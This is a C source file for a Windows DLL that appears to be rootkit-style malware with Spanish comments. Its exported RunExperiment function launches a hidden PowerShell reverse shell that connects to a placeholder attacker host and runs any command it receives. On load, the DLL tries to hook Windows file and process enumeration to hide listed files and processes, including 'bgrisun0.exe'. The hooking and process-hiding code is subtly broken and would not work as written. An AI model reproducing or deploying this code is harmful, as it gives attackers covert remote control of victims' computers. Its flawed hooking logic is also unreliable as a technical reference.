#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

#define MAX_HIDE_PIDS 140
#define PID_FILE_PATH "C:\\Windows\\System32\\pid.txt"
#define FILE_HIDE_PATH "C:\\Windows\\System32\\hide.txt"

char* hide_pids[MAX_HIDE_PIDS] = { NULL };
char* hide_files[MAX_HIDE_PIDS] = { NULL };

// Declare the function to be exported
__declspec(dllexport) void __cdecl RunExperiment(void);


// Define the RunExperiment function
void __cdecl RunExperiment() {
    // This function will be called programmatically
    WinExec("powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{lhost}', {listener});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream \";while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"", 1);
}

void load_hidden_pids() {
    FILE* file = fopen(PID_FILE_PATH, "r");
    if (!file) {
        DWORD error = GetLastError();
        char errorMsg[256];
        FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, errorMsg, sizeof(errorMsg), NULL);
        fprintf(stderr, "Error opening PID file: %s\n", errorMsg);
        return;
    }

    char buffer[256];
    int index = 0;
    while (fgets(buffer, sizeof(buffer), file)) {
        char* pid = strtok(buffer, ",\"\n");
        while (pid && index < MAX_HIDE_PIDS) {
            hide_pids[index++] = _strdup(pid);
            pid = strtok(NULL, ",\"\n");
        }
    }

    fclose(file);
}

void load_hidden_files() {
    int retry_count = 0;
    const int MAX_RETRIES = 3;

    while (retry_count < MAX_RETRIES) {
        FILE* file = fopen(FILE_HIDE_PATH, "r");
        if (!file) {
            fprintf(stderr, "Attempt %d: Error opening FILE hide file: %s\n",
                retry_count + 1, strerror(errno));
            Sleep(1000 * (retry_count + 1));
            retry_count++;
            continue;
        }

        char buffer[256];
        int index = 0;

        while (fgets(buffer, sizeof(buffer), file) && index < MAX_HIDE_PIDS) {
            char* filename = strtok(buffer, ",\"\n");

            while (filename && index < MAX_HIDE_PIDS) {
                hide_files[index] = _strdup(filename);
                if (hide_files[index] == NULL) {
                    fprintf(stderr, "Memory allocation failed for index %d\n", index);
                    break;
                }

                index++;
                filename = strtok(NULL, ",\"\n");
            }
        }

        if (index >= MAX_HIDE_PIDS) {
            fprintf(stderr, "Warning: Reached maximum number of hidden files (%d)\n", MAX_HIDE_PIDS);
        }

        fclose(file);
        return;
    }

    fprintf(stderr, "Warning: Could not load hidden files after %d attempts\n", MAX_RETRIES);
}
DWORD FindProcessId(const char* processName) {
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    Process32First(processesSnapshot, &processInfo);
    if (!stricmp(processInfo.szExeFile, processName)) {
        CloseHandle(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo)) {
        if (!stricmp(processInfo.szExeFile, processName)) {
            CloseHandle(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    CloseHandle(processesSnapshot);
    return 0;
}

void HideProcessByPID(DWORD pid) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (pe.th32ProcessID == pid) {
                // Modificar la estructura de datos para ocultar el proceso
                pe.th32ProcessID = 0;
                strcpy(pe.szExeFile, "");
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
}

BOOL search_pid() {
    DWORD pid = FindProcessId("bgrisun0.exe");
    if (pid != 0) {
        HideProcessByPID(pid);
        printf("Process hidden\n");
    } else {
        printf("Process not found\n");
    }
    return TRUE;
}
BOOL should_hide_pid(DWORD pid) {
    char pid_str[20];
    search_pid();
    sprintf(pid_str, "%lu", pid);
    for (int i = 0; i < MAX_HIDE_PIDS && hide_pids[i] != NULL; i++) {
        if (strcmp(hide_pids[i], pid_str) == 0) {
            HideProcessByPID(atoi(pid_str));
            return TRUE;
        }
    }
    return FALSE;
}


BOOL should_hide_file(const char* filename) {
    for (int i = 0; i < MAX_HIDE_PIDS && hide_files[i] != NULL; i++) {
        if (strcmp(hide_files[i], filename) == 0) {
            return TRUE;
        }
    }
    return FALSE;
}

// Hook para FindFirstFile
HANDLE WINAPI HookedFindFirstFile(LPCSTR lpFileName, LPWIN32_FIND_DATA lpFindFileData) {
    if (should_hide_file(lpFileName)) {
        SetLastError(ERROR_FILE_NOT_FOUND);
        return INVALID_HANDLE_VALUE;
    }
    return FindFirstFile(lpFileName, lpFindFileData);
}

// Hook para FindNextFile
BOOL WINAPI HookedFindNextFile(HANDLE hFindFile, LPWIN32_FIND_DATA lpFindFileData) {
    if (should_hide_file(lpFindFileData->cFileName)) {
        SetLastError(ERROR_NO_MORE_FILES);
        return FALSE;
    }
    return FindNextFile(hFindFile, lpFindFileData);
}

// Hook para CreateToolhelp32Snapshot
HANDLE WINAPI HookedCreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(dwFlags, th32ProcessID);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return INVALID_HANDLE_VALUE;
    }
    return hSnapshot;
}

// Hook para Process32First
BOOL WINAPI HookedProcess32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
    BOOL result = Process32First(hSnapshot, lppe);
    while (result) {
        if (!should_hide_pid(lppe->th32ProcessID)) {
            return TRUE;
        }
        result = Process32Next(hSnapshot, lppe);
    }
    return FALSE;
}

// Hook para Process32Next
BOOL WINAPI HookedProcess32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe) {
    BOOL result = Process32Next(hSnapshot, lppe);
    while (result) {
        if (!should_hide_pid(lppe->th32ProcessID)) {
            return TRUE;
        }
        result = Process32Next(hSnapshot, lppe);
    }
    return FALSE;
}

// Función para realizar el hooking de las funciones
void HookFunctions() {
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    if (hKernel32) {
        // Hook FindFirstFile
        FARPROC originalFindFirstFile = GetProcAddress(hKernel32, "FindFirstFileA");
        if (originalFindFirstFile) {
            DWORD oldProtect;
            VirtualProtect(&originalFindFirstFile, sizeof(FARPROC), PAGE_READWRITE, &oldProtect);
            *(FARPROC*)&originalFindFirstFile = (FARPROC)HookedFindFirstFile;
            VirtualProtect(&originalFindFirstFile, sizeof(FARPROC), oldProtect, &oldProtect);
        }

        // Hook FindNextFile
        FARPROC originalFindNextFile = GetProcAddress(hKernel32, "FindNextFileA");
        if (originalFindNextFile) {
            DWORD oldProtect;
            VirtualProtect(&originalFindNextFile, sizeof(FARPROC), PAGE_READWRITE, &oldProtect);
            *(FARPROC*)&originalFindNextFile = (FARPROC)HookedFindNextFile;
            VirtualProtect(&originalFindNextFile, sizeof(FARPROC), oldProtect, &oldProtect);
        }

        // Hook CreateToolhelp32Snapshot
        FARPROC originalCreateToolhelp32Snapshot = GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
        if (originalCreateToolhelp32Snapshot) {
            DWORD oldProtect;
            VirtualProtect(&originalCreateToolhelp32Snapshot, sizeof(FARPROC), PAGE_READWRITE, &oldProtect);
            *(FARPROC*)&originalCreateToolhelp32Snapshot = (FARPROC)HookedCreateToolhelp32Snapshot;
            VirtualProtect(&originalCreateToolhelp32Snapshot, sizeof(FARPROC), oldProtect, &oldProtect);
        }

        // Hook Process32First
        FARPROC originalProcess32First = GetProcAddress(hKernel32, "Process32First");
        if (originalProcess32First) {
            DWORD oldProtect;
            VirtualProtect(&originalProcess32First, sizeof(FARPROC), PAGE_READWRITE, &oldProtect);
            *(FARPROC*)&originalProcess32First = (FARPROC)HookedProcess32First;
            VirtualProtect(&originalProcess32First, sizeof(FARPROC), oldProtect, &oldProtect);
        }

        // Hook Process32Next
        FARPROC originalProcess32Next = GetProcAddress(hKernel32, "Process32Next");
        if (originalProcess32Next) {
            DWORD oldProtect;
            VirtualProtect(&originalProcess32Next, sizeof(FARPROC), PAGE_READWRITE, &oldProtect);
            *(FARPROC*)&originalProcess32Next = (FARPROC)HookedProcess32Next;
            VirtualProtect(&originalProcess32Next, sizeof(FARPROC), oldProtect, &oldProtect);
        }
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        load_hidden_pids();
        load_hidden_files();
        HookFunctions(); // Realizar el hooking de las funciones
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        for (int i = 0; i < MAX_HIDE_PIDS; i++) {
            if (hide_pids[i] != NULL) {
                free(hide_pids[i]);
            }
            if (hide_files[i] != NULL) {
                free(hide_files[i]);
            }
        }
        break;
    }
    return TRUE;
}
